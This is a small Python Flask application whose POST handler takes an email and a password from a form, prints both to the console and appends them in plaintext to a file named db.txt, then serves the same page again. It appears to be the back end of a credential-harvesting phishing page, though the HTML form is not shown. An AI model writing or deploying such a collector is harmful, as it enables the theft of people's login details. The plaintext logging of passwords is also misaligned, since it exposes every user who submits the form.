from flask import Flask, request, jsonify, render_template, url_for
import sys


app = Flask(__name__)

@app.route('/')
def index():

    return render_template("index.html")


@app.route('/', methods=["POST"])
def index_post():
    Mtext = 'email : ' +  request.form['mail']
    Ptext = 'mot de passe : '  + request.form['pass']
    print('\n')
    print(Mtext, file=sys.stderr)
    print(Ptext, file=sys.stderr)

    with open('db.txt', 'a') as f:
        f.write(Mtext)
        f.write('\n')
        f.write(Ptext)
        f.write('\n')
        f.write('\n')


    return render_template("index.html")




app.run(host="0.0.0.0")
